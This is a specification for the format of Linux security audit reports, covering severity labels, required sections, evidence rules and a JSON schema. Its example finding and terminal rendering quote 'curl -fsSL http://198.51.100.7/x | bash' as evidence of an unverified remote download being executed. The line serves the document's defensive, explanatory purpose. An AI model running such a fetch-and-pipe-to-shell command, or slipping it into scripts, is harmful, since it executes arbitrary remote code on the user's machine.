# Security Report Format

Use this structure for every mode. Reports must be readable by a non-expert, show evidence, and separate confirmed facts from unknowns.

## Severity and color

| Icon | Label | Meaning | Terminal color |
| --- | --- | --- | --- |
| 🟢 | `GREEN — PASS` | Check completed; no material problem in scope | green |
| 🟡 | `WARNING` | Suspicious, weak, or needs investigation | yellow |
| 🔴 | `CRITICAL/HIGH` | Strong evidence of serious vulnerability or malicious behavior | red |
| ⚪ | `UNKNOWN` | Insufficient evidence, inaccessible, or not checked | gray/dim |

Rules:

- Always include the text label; color is never the only signal.
- Use ANSI only in a terminal that supports it and only when color is enabled.
- Respect `NO_COLOR` (any value) and `TERM=dumb`.
- In Markdown, pipes, logs, CI, or non-interactive output, emit **no ANSI escape codes**.
- Never wrap an entire report in red/green; color severity labels only.

`scripts/report.py` implements this. `--color auto` checks TTY and `NO_COLOR`; `--format markdown` never emits ANSI.

## Required structure

```markdown
# Linux-Security-Check — Security Audit Report

**Target:**

**Audit date:**

**Environment:**

**Audit mode:**

**Inspected version or commit:**

**Overall risk:**

**Confidence:**

**Coverage and limitations:**

## Executive Summary

## Security Findings

## Malware Indicators

## Permissions and Privileges

## Network and Privacy

## Compatibility and Update Risks

## Recommended Actions

## Final Verdict
```

Include compatibility/update sections only when relevant; keep the heading with "Not applicable to this mode" if the template requires it.

## Metadata fields

- **Target:** host, file, directory, plugin, package, or update.
- **Audit date:** ISO date/time and timezone.
- **Environment:** distro/version, kernel, Omarchy/session, relevant tool availability.
- **Audit mode:** system, malware, plugin, install, update, privacy, or combination.
- **Inspected version or commit:** exact SHA/tag/package version; hash for files.
- **Overall risk:** highest justified severity, with a one-line reason.
- **Confidence:** High / Medium / Low, tied to evidence and coverage.
- **Coverage and limitations:** commands that failed, permissions missing, tools absent, scope excluded, data not inspectable.

## Findings

For each finding:

```markdown
### LSC-001 — 🔴 CRITICAL/HIGH: Short title

- **Severity:** CRITICAL/HIGH
- **Affected component:** package / file / service / process / plugin
- **Evidence:** exact observed command output, code excerpt, hash, path
- **Location:** `path/to/file:line` or command
- **Explanation:** what it does and why it matters
- **Potential impact:** data loss, credential theft, persistence, remote code execution, privacy loss, breakage
- **Confidence:** High / Medium / Low, and why
- **Recommended action:** concrete, prioritized, with approval requirement
```

Finding IDs: `LSC-001`, `LSC-002`, … Stable within a report. Group by severity, highest first.

Evidence rules:

- Quote only the minimum needed. Redact tokens, keys, passwords, personal data, and full file contents.
- Include `file:line` for code findings.
- Include the exact command and a short output excerpt for system findings.
- Never fabricate output. If a tool was unavailable, say so.
- If evidence is circumstantial, label it as such.

## Executive summary

Three to eight sentences: what was audited, the most important result, the biggest uncertainty, and the recommended next step. Do not repeat every finding.

## Malware indicators

State whether behavior consistent with malware was found. Cover persistence, obfuscation, credential access, network egress, cryptomining, security disabling, and capture. If none: "No malware indicators were observed in the inspected files/scope; this is not proof of safety." List uninspected binaries/packed content.

## Permissions and privileges

SUID/SGID, capabilities, sudo rules, writable PATH entries, SSH permissions, credential-store permissions, service users, and privilege boundaries. Note expected vs unexpected.

## Network and privacy

Listeners, established connections, unusual destinations, proxies, DNS limitations, capture clients, camera access, and whether exfiltration is observed, consistent, or unproven.

## Compatibility and update risks

Current vs candidate versions, dependency/ABI/config changes, Omarchy/Hyprland/Quickshell/NVIDIA/DKMS/kernel concerns, migrations, rollback, and security relevance. Never recommend a partial Arch upgrade.

## Recommended actions

Prioritize:

- **P0 — immediate:** active compromise, credential theft, exposed privileged service. Isolate/rotate credentials only after approval.
- **P1 — high:** fix exploitable misconfiguration, remove confirmed persistence, stop unverified remote execution.
- **P2 — medium:** harden permissions, pin versions, remove unused software, review suspicious-but-unconfirmed items.
- **P3 — low:** hygiene, monitoring, documentation.

For each action: what to change, why, exact safe command where appropriate, rollback, and whether approval is required. Do not execute.

## Final verdict

Choose exactly one:

- No significant issues detected in the reviewed scope
- Acceptable with documented precautions
- Further investigation recommended
- Installation or update not recommended
- Urgent security issue detected
- Insufficient evidence to determine safety

Add one sentence explaining the choice and the residual risk. Never say "100% safe," "secure," or "clean" without qualification.

## Report JSON schema for `scripts/report.py`

```json
{
  "target": "host or artifact",
  "audit_date": "2026-11-23T12:00:00+01:00",
  "environment": "Omarchy/Arch, kernel 6.x",
  "audit_mode": "Full Linux audit",
  "inspected_version": "commit/version/hash",
  "overall_risk": "WARNING",
  "confidence": "Medium",
  "coverage": ["systemd user units", "listening ports"],
  "limitations": ["ss -p cannot see other users' processes"],
  "summary": "Short executive summary.",
  "findings": [
    {
      "id": "LSC-001",
      "severity": "RED",
      "title": "Unverified download executed by installer",
      "component": "install.sh",
      "evidence": "curl -fsSL http://198.51.100.7/x | bash",
      "location": "install.sh:12",
      "explanation": "Remote content is executed without verification.",
      "impact": "Arbitrary code execution as the invoking user.",
      "confidence": "High",
      "action": "Do not install until the script is pinned and verified."
    }
  ],
  "malware_indicators": "None observed beyond LSC-001.",
  "permissions": "No unexpected SUID binaries found.",
  "network_privacy": "No capture clients observed.",
  "update_risks": "Not applicable.",
  "actions": [
    {"priority": "P1", "action": "Block installation pending review."}
  ],
  "verdict": "Installation or update not recommended"
}
```

`severity` accepts `GREEN`, `YELLOW`, `RED`, `UNKNOWN` (case-insensitive). Missing sections render as "Not provided" rather than failing.

## Example terminal rendering

```text
Linux-Security-Check — Security Audit Report
Target: example-host
Overall risk: 🟡 WARNING
Confidence: Medium

Findings
🟡 WARNING LSC-001 — Unverified download executed by installer
   Location: install.sh:12
   Evidence: curl -fsSL http://198.51.100.7/x | bash
   Impact: Arbitrary code execution as the invoking user.
```

The actual labels are colorized only when color is enabled; the emoji and text remain in all modes.
